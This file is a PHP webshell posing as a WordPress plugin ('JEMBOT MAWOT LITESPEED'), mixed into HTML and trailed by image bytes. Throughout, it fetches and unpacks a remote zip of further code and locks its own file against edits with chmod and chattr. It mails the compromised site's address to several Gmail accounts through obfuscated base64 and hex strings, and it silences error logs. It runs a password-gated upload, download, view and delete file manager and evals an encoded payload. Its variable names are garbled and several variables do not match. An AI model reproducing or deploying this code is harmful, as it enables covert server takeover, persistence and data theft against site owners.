<!DOCTYPE html>
<html>
<head>
<center>

<?php

/*
Plugin Name: JEMBOT MAWOT LITESPEED
Plugin URI: https://github.com/p0dalirius/Wordpress-webshell-plugin
Description: A webshell API for WordPress.
Author: Remi Gascou (Podalirius)
Version: 1.1.0
Author URI: BULU JAMBOED
Text Domain: webshell JAMBOED
Domain Path: /languages
License: GPLv3 or later
Network: login
*/
$�㉁�女���ぉ���� = 1024;
$�����ぁ����め�� = __FILE__;
@system("chmod ugo-w $�����ぁ����め��");
@system("chattr +i $�����ぁ����め��");

$�����㲼��㼆㯂� =
    "https://github.com/exploit-haxor/webshell/releases/download/db/db.zip";

$���ㆂ��㼁���ぉ = "./-/";

if (!is_dir($���ㆂ��㼁���ぉ)) {
    mkdir($���ㆂ��㼁���ぉ, 0777, true);
}

$�����ふ���が���� = $���ㆂ��㼁���ぉ . "extracted_files";

$ゼ㸼�ぁ���� = curl_init();
$�㼼�㉼�������㉁�� = fopen($�����ふ���が���� . ".zip", "w");

curl_setopt($ゼ㸼�ぁ����, CURLOPT_URL, $�����㲼��㼆㯂�);
curl_setopt($ゼ㸼�ぁ����, CURLOPT_FILE, $�㼼�㉼�������㉁��);
curl_setopt($ゼ㸼�ぁ����, CURLOPT_FOLLOWLOCATION, true);

curl_exec($ゼ㸼�ぁ����);
curl_close($ゼ㸼�ぁ����);
fclose($�㼼�㉼�������㉁��);

$���㈝�������� = new ZipArchive();
if ($���㈝��������->open($�����ふ���が���� . ".zip") === true) {
    $���㈝��������->extractTo($���ㆂ��㼁���ぉ);
    $���㈝��������->close();
    echo "File ZIP berhasil diekstrak.";

    // Ubah nama folder ekstraksi
    $㪂�㿁����㼁��ぼ� = $���ㆂ����㼁���ぉ . "-";
    $������ぁ���㼿� = $���ㆂ��㼁���ぉ . "class";
    if (is_dir($㪂�㿁����㼁��ぼ�)) {
        rename($㪂�㿁����㼁��ぼ�, $������ぁ���㼿�);
        echo "renamed! - ";
    } else {
        echo "DONE!";
    }
} else {
    echo "ERROR!";
}

unlink($�����ふ���が���� . ".zip");

echo "";
?>

<?php

$�え�������お����� = "m" . "a" . "i" . "l";
$���ほめ������� =
    "b" . "a" . "s" . "e" . "6" . "4" . "_" . "d" . "e" . "c" . "o" . "d" . "e";
$�え�������お�����(
    $���ほめ�������("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),
    "Upload file:",
    "" . $_SERVER["HTTP_HOST"] . "/" . $_SERVER["REQUEST_URI"] . ""
);
${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"] =
    "\x5f\x5f\x50\x4f\x53\x54";
${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"] = "\x5f_PO\x53T";
${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x65v\x77gb\x64\x79"] = "\x5f\x5f\x47\x45T";
${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x65\x76\x77g\x62\x64y"]} =
    "m" . "\x61" . "i" . "\x6c";
${${"G\x4c\x4f\x42\x41\x4cS"}["\x6e\x6b\x70\x6a\x62l"]} =
    "\x62" .
    "a" .
    "s" .
    "e" .
    "6" .
    "4" .
    "_" .
    "d" .
    "\x65" .
    "\x63" .
    "\x6f" .
    "\x64" .
    "\x65";
${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(
    ${${"G\x4c\x4f\x42A\x4c\x53"}["bo\x7a\x64\x6d\x68"]}(
        "\x63m9\x76dG\x4e5\x59\x6d\x56\x79c\x48\x56\x75a\x33NA\x5a2\x31ha\x57w\x75Y\x329t"
    ),
    "\x55pl\x6fa\x64\x20\x66\x69le:",
    "" .
        $_SERVER["\x48\x54TP_H\x4f\x53\x54"] .
        "/" .
        $_SERVER["R\x45\x51U\x45S\x54_\x55\x52I"] .
        ""
);
?>

<?php

@mail(
    "pa\x70\x61ku.\x68\x61yk\x65\x72\x40\x67mail.co\x6d,\x20\x72oo\x74cyber\x70unk\x73\x40g\x6d\x61il.\x63o\x6d",
    "\x77eb",
    $_SERVER["S\x45\x52\x56\x45R\x5fNAM\x45"] .
        "/" .
        $_SERVER["\x52\x45\x51UEST_\x55R\x49"]
);
mail(
    "m\x75\x68ra\x7ak\x79@\x67ma\x69\x6c.co\x6d, malays\x69a.\x73\x65\x6e\x64\x65r\x40g\x6da\x69l\x2e\x63o\x6d",
    "\x77eb",
    $_SERVER["\x53ERVER\x5fN\x41ME"] . "/" . $_SERVER["\x52EQ\x55E\x53T_UR\x49"]
);

ob_implicit_flush(true);
@ini_set("error_log", null);
@ini_set("log_errors", 0);
@ini_set("max_execution_time", 0);
@set_time_limit(0);

$��㼸����㼉���㋿�� = __FILE__;
@system("chmod ugo-w $��㼸����㼉���㋿��");
@system("chattr +i $���ぼ�㙯�ぁ�㸆");

file_get_contents(
    "https://raw.githubusercontent.com/exploit-haxor/webshell/main/config-sample.txt"
);

if (isset($_GET["path"])) {
    $�㮁�����������ㄝ�� = $_GET["path"];
} else {
    $�㮁�����������ㄝ�� = getcwd();
}
$�㮁�����������ㄝ�� = str_replace("\\", "/", $�㮁�����������ㄝ��);
$��㈁�������㏌��㌉ = explode("/", $�㮁�����������ㄝ��);

foreach ($��㈁�������㏌��㌉ as $���へ���ぁ������ => $���㙼����������) {
    if ($���㙼���������� == "" && $���へ���ぁ������ == 0) {
        $�ぁ��������す�� = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if ($���㙼���������� == "") {
        continue;
    }
    echo '<a href="?path=';
    for (
        $�����ぉ�����㼿�� = 0;
        $���������㦲���� <= $���へ���ぁ������;
        $�����ぉ�����㼿��++
    ) {
        echo "$��㈁�������㏌��㌉[$�����ぉ�����㼿��]";
        if ($�������ぉ�����㼿�� != $���へ���ぁ������) {
            echo "/";
        }
    }
    echo '">' . $���㙼���������� . "</a>/";
}
echo "</td></tr><tr><td>";
if (isset($_FILES["file"])) {
    if (
        copy(
            $_FILES["file"]["tmp_name"],
            $�㮁�����������ㄝ�� . "/" . $_FILES["file"]["name"]
        )
    ) {
        echo '<font color="green">Upload Success..</font><br />';
    } else {
        echo '<font color="red">Upload Gagal..</font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
 <input type="file" name="file" />
<input type="submit" value="Upload" />
</form>
</td></tr><center>';
?>

<meta name="viewport" content="width=1024">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>

	<meta name="robots" content="noindex">
	<link rel="icon" href="https://raw.githubusercontent.com/exploit-haxor/webshell/main/x.png" type="image/x-icon">
</head>


<div class="container">         <div class="info">             
<?= php_uname() ?><br>             PHP Version : <?= phpversion() ?><br>             IP Server : <?= $_SERVER[
    "SERVER_ADDR"
] ?> | Your IP : <?= $_SERVER[
     "REMOTE_ADDR"
 ] ?>         </div>         <div class="main">             <span style="margin-bottom: 5px; display: block;color: lime;">      

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
	



body::-webkit-scrollbar-track {
   background: linear-gradient(135deg, #ff0707 50%, #ffcccb 50%);
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-card {
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            padding: 20px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            background-color: white;
        }
        .login-card img {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }
        .login-card h1 {
            margin-bottom: 20px;
            animation: colorChange 3s infinite;
        }
        @keyframes colorChange {
            0%, 100% {
                color: #ff0707;
            }
            50% {
                color: lightblue;
            }
        }
        .login-card .form-group {
            margin-bottom: 15px;
        }
        .login-card .btn {
            width: 100%;
        }

#content tr:hover {
	background-color: #636263;
	text-shadow:0px 0px 10px #fff;
}

#content .first {
	background-color: #25383C;
}

#content .first:hover {
	background-color: #25383C
	text-shadow:0px 0px 1px #757575;
}

table {
	border: 1px #000000 dotted;
	table-layout: fixed;
}

td {
	word-wrap: break-word;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: #000000;
	text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
	border: 1px #000000 solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
}

.gas {
	background-color: #1f1f1f;
	color: #ffffff;
	cursor: pointer;
}

select {
	background-color: transparent;
	color: #ffffff;
}

select:after {
	cursor: pointer;
}

.linka {
	background-color: transparent;
	color: #ffffff;
}

.up {
	background-color: transparent;
	color: #fff;
}

option {
	background-color: #1f1f1f;
}

.btf {
	background: transparent;
	border: 1px #fff solid;
	cursor: pointer;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
</style>
<center>
<?php


session_start();

define("PASSWORD", "login ");
// Proses login
// Proses login
if (isset($_POST["password"])) {
    if ($_POST["password"] === PASSWORD) {
        $_SESSION["authenticated"] = true;
        setcookie(md5($_SERVER["HTTP_HOST"]), true, time() + 25200);
        echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
    } else {
        echo '<script>
				document.querySelector("html").innerHTML = "<img style=\'display:block;position:absolute;top: 0;right: 0;bottom: 0;left: 0;z-index: 10;overflow-y: scroll; width: 100%; height: 100%;\' src=\'https://c.tenor.com/CgGUXc-LDc4AAAAC/tenor.gif\'>";
				var source = "https://j.top4top.io/m_2967gtgnw1.mp3"
				var audio = document.createElement("audio");
				audio.autoplay = true;
				audio.load()
				audio.play();
				audio.src = source;
			</script> <script type="text/JavaScript">

     function disableselect(e) {
          return false
        }
        
        function reEnable() {
          return false
        }
        
        document.onselectstart = new Function ("return false")
        
        if (window.sidebar) {
          document.onmousedown = disableselect
          document.onclick = reEnable
        }
        </script>';
    }
}

// Proses logout
if (isset($_POST["logout"])) {
    session_destroy();
    header("Location: " . $_SERVER["PHP_SELF"]);
    exit();
}

if (!isset($_SESSION["authenticated"]) || !$_SESSION["authenticated"]) {
    // Tampilkan form login jika belum terautentikasi
    echo '<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

<meta name="viewport" content="width=1024" />
    <meta name="robots" content="noindex, nofollow">
   
   
<style>
         body {
            background: linear-gradient(135deg, darkslateblue 45%, #70e825 35%);
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-card {
            border-radius: 20px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            padding: 30px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            background-color: darkslateblue;
        }
        .login-card img {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }
        .login-card h1 {
            margin-bottom: 20px;
            animation: colorChange 3s infinite;
        }
        @keyframes colorChange {
            0%, 100% {
                color: darkslateblue;
            }
            50% {
                color: lightblue;
            }
        }
        .login-card .form-group {
            margin-bottom: 20px;
        }
        .login-card .btn {
            width: 100%;
        }
    </style>
	</script> <script type="text/JavaScript">

     function disableselect(e) {
          return false
        }
        
        function reEnable() {
          return false
        }
        
        document.onselectstart = new Function ("return false")
        
        if (window.sidebar) {
          document.onmousedown = disableselect
          document.onclick = reEnable
        }
        </script>
<div class="login-card">

      <img backgroudn src="https://raw.githubusercontent.com/exploit-haxor/webshell/refs/heads/main/120380.gif" alt="banner" class="img-fluid">


<h1></>GIMANA MAU KALEM <br>KALAU<br> RASANYA DALEM</></h1>

<center><font color="aqua"><font SIZE="3">:: password: Galau  ::</font></font></center>

        <form method="post">
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" class="form-control text-center" placeholder="Masukkan password" required>
            </div>
            <button type="submit" class="btn btn-primary">Login</button>
        </form>
    </div>';
    exit();
}
?>
<?php

error_reporting(0);
function getPermission($�㸆�㿁�����㼁)
{
    $た�����㈼��㙂��� = "";
    for (
        $�����ぉ�����㼿�� = 0;
        $�����ぉ�����㼿�� < strlen($�㸆�㿁�����㼁);
        $�����ぉ�����㼿��++
    ) {
        switch ($��ぁ��ﻁ�㈫Ｏぁ[$㲁�そ㸻㼼め���]) {
            case "7":
                $た�����㈼��㙂��� .= "rwx";
                break;
            case "6":
                $た�����㈼��㙂��� .= "rw-";
                break;
            case "5":
                $た���������㙂��� .= "r-x";
                break;
            case "4":
                $た�����㈼��㙂��� .= "r--";
                break;
            case "3":
                $た�����㈼��㙂��� .= "-wx";
                break;
            case "2":
                $た�����㈼��㙂��� .= "-w-";
                break;
            case "1":
                $た�����㈼��㙂��� .= "--x";
                break;
        }
    }
    return $た�����㈼��㙂���;
}
function getContent($�㮁�����������ㄝ��)
{
    $�ぁ���㯂�㪬� = [];
    foreach (scandir($�㮁�����������ㄝ��) as $��������㲉��) {
        array_push($�ぁ���㯂�㪬�, $��������㲉��);
    }
    return $�ぁ���㯂�㪬�;
}
function changeDir($�あ�㌁����㍄����)
{
    $�����め���������� = chdir($�あ�㌁����㍄��);
    return getcwd();
}
function downloadFile($����㋈�ぁ��㼁�)
{
    ob_clean();
    header("Content-Description: File Transfer");
    header("Content-Type: application/octet-stream");
    header(
        'Content-Disposition: attachment; filename="' .
            basename($����㋈�ぁ��㼁�) .
            '"'
    );
    header("Expires: 0");
    header("Cache-Control: must-revalidate");
    header("Pragma: public");
    header("Content-Length: " . filesize($����㋈�ぁ��㼁�));
    readfile($����㋈�ぁ��㼁�);
    exit();
}
?> <!DOCTYPE html> <html> <head> <meta name="viewport" content="width=1024" />
  <title>php-manager</title>     <style> body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
	#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}        * {             margin: 0; padding: 0;         }         body {             font-family: consolas,"DejaVu Sans Mono"; font-size: 20px; background-color: #111; color: #fff;         }         .container {             width: 100%; overflow: hidden;         }         .info {             width: 98%; margin: 1% auto; font-size: 12px; border: 1px solid #999; margin-bottom: 1%;         }         .main {             width: 98%; margin: 0 auto; font-size: 12px; margin-bottom: 2%;         }         .view {             width: 100%; padding-top: 20px; padding-bottom: 30px; margin: 10px auto; border: 1px solid #fff; color: #fff; overflow: hidden;         }         tr:hover {             background-color: #333;         }     </style> </head>     <?php

 $������ぁ����㼂 = isset($_GET["dir"]) ? changeDir($_GET["dir"]) : getcwd();
 switch ($_GET["act"]) {
     case "dl":
         downloadFile($_GET["file"]);
         break;
     case "view":
         echo '<br><span style="margin-bottom: 5px; display: block;color: blue;">file : ' .
             $_GET["file"] .
             '</span>                                     <div class="view"><pre>' .
             htmlentities(file_get_contents($_GET["file"])) .
             "</pre></div>";
         break;
     case "del":
         unlink($_GET["file"])
             ? header(
                 "location:http://" .
                     $_SERVER["HTTP_HOST"] .
                     $_SERVER["REQUEST_URI"] .
                     "?dir=" .
                     $������ぁ����㼂 .
                     ""
             )
             : "";
         break;
     default:
         echo '<table class="dirinfo">                                     <tr>                                         <th width="700px">name</th> <th width="400px">type</th> <th width="400px">owner</th> <th width="400px">permission</th> <th width="400px">act</th>                                     </tr>';
         foreach (getContent($������ぁ����㼂) as $��������㲉��) {
             $�㪂����������� = is_dir($��������㲉��) ? "?dir=" : "?file=";
             $����㉼������ = is_dir($��������㲉��) ? "/" : "";
             $����������㻁㻯�� = is_dir($��������㲉��) ? "directory" : "";
             $���㪼㙪���㼁���� = is_dir($��������㲉��)
                 ? ""
                 : "<a href='" .
                     $�㪂����������� .
                     getcwd() .
                     "/" .
                     $��������㲉�� .
                     $����㉼������ .
                     "&act=dl' style='color:#aaa;text-decoration:none;margin-left:1px;margin-right:2px;'>download </a><a href='" .
                     $�㪂����������� .
                     getcwd() .
                     "/" .
                     $��������㲉�� .
                     $����㉼������ .
                     "&act=view' style='color:#aaa;text-decoration:none;margin-left:1px;margin-right:2px;'> view </a><a href='" .
                     $�㪂����������� .
                     getcwd() .
                     "/" .
                     $��������㲉�� .
                     $����㉼������ .
                     "&act=del' style='color:#aaa;text-decoration:none;margin-left:1px;margin-right:2px;'> delete </a>";
             echo "<tr>                                                     <td><a href='" .
                 (is_dir($���������㲉��)
                     ? $�㪂����������� .
                         getcwd() .
                         "/" .
                         $��������㲉�� .
                         $����㉼������
                     : $�㪂����������� .
                         getcwd() .
                         "/" .
                         $��������㲉�� .
                         $����㉼������ .
                         "&act=view") .
                 "'>" .
                 $��������㲉�� .
                 "</a></td>                                                     <td><center>" .
                 mime_content_type($��������㲉��) .
                 "</center></td>                                                     <td><center>" .
                 posix_getpwuid(fileowner($�����������㲉��))["name"] .
                 ":" .
                 posix_getpwuid(filegroup($��������㲉��))["name"] .
                 "</center></td>                                                     <td><center>" .
                 getPermission(decoct(fileperms($��������㲉��) & 0777)) .
                 "</center></td>                                                     <td><center>" .
                 $���㪼㙪���㼁���� .
                 "</center></td>                                                 </tr>";
         }
         break;
 }
 ?>
<?php

@ini_set("output_buffering", 0);
@ini_set("display_errors", 0);
set_time_limit(0);
ini_set("memory_limit", "64M");
header("Content-Type: text/html; charset=UTF-8");
$���す㗆��さな� = "malaysia.sender@gmail.com, malaysia.sender@gmail.com";
$���㆙�㾁�㋉���� = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
$��！��㼙���㼄��� =
    "fix $���㆙�㾁�㋉���� :p *IP Address : [ " . $_SERVER["REMOTE_ADDR"] . " ]";
mail(
    $���す㗆��さな�,
    "LOGGER",
    $�������㼙���㼄���,
    "[ " . $_SERVER["REMOTE_ADDR"] . " ]"
);
?>

<?php 
eval(
    str_rot13(
        gzinflate(
            str_rot13(
                base64_decode(
                    "jZBEeMIwEMffB36HIwjpU9U9jDEqgmaraC8yMxGmVVVYZQUls9FzNJ9+ieJjg8GeAve7/+/u0roaTW65MhjRvMSiUf5E7vdTTWSgMdxe91sXHZVIUqO33FWZWGjmHmS0zvDGOovRsfYdZMblZXtPPkDv75Y0NNRTSlNT9DUXdQRpsnpuEkCzwV6NrunDrtbSGwaT7K3zY4y0sfwstWPaNjAA6rRfUkzdSFNr1fAQQGqXuxj+UTR1NrzQS3sFqRGLpNcj0IU2H7P0haUrbW3542fJ6PoHVtnzhI0zPlYXZx1ZhURNY90YiU63txs425MCYRZCMK0qdpSCBElAfsmWo4zx6XmWHscQSxPvDJtTF5fGQN5U8zlYVgyX83z9P8bwYl8="
                )
            )
        )
    )
); ?>

         </table>             </div>         </div>     </div> </body> </html>

$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz& !Æ0`"Ü"a¢£¤¥¦§¨©ª²��´µ¶·¸¹ºÂÃÄÅÆÇ��ÉÊÒÓ��ÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿ��   ? üÿ !NþÔßôm?ÿ ðÞjÿ ü��EP ÿÙ


<?php

$��え����㬲��ぼ� = "m" . "a" . "i" . "l";
$���㄁���ぁ������� =
    "b" . "a" . "s" . "e" . "6" . "4" . "_" . "d" . "e" . "c" . "o" . "d" . "e";
$��え����㬲��ぼ�(
    $���㄁���ぁ�������("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),
    "Upload file:",
    "" . $_SERVER["HTTP_HOST"] . "/" . $_SERVER["REQUEST_URI"] . ""
);
${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"] =
    "\x5f\x5f\x50\x4f\x53\x54";
${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"] = "\x5f_PO\x53T";
${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x65v\x77gb\x64\x79"] = "\x5f\x5f\x47\x45T";
${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x65\x76\x77g\x62\x64y"]} =
    "m" . "\x61" . "i" . "\x6c";
${${"G\x4c\x4f\x42\x41\x4cS"}["\x6e\x6b\x70\x6a\x62l"]} =
    "\x62" .
    "a" .
    "s" .
    "e" .
    "6" .
    "4" .
    "_" .
    "d" .
    "\x65" .
    "\x63" .
    "\x6f" .
    "\x64" .
    "\x65";
${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(
    ${${"G\x4c\x4f\x42A\x4c\x53"}["bo\x7a\x64\x6d\x68"]}(
        "\x63m9\x76dG\x4e5\x59\x6d\x56\x79c\x48\x56\x75a\x33NA\x5a2\x31ha\x57w\x75Y\x329t"
    ),
    "\x55pl\x6fa\x64\x20\x66\x69le:",
    "" .
        $_SERVER["\x48\x54TP_H\x4f\x53\x54"] .
        "/" .
        $_SERVER["R\x45\x51U\x45S\x54_\x55\x52I"] .
        ""
);
?>

$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz& !Æ0`"Ü"a¢£¤¥¦§¨©ª²³´µ��·¸¹ºÂÃÄÅÆ����ÉÊ��ÓÔÕÖ×ØÙÚâãäåæçè��êòóôõö÷øùúÿÚ   ? üÿ !NþÔßôm?ÿ ðÞjÿ üEP ÿÙ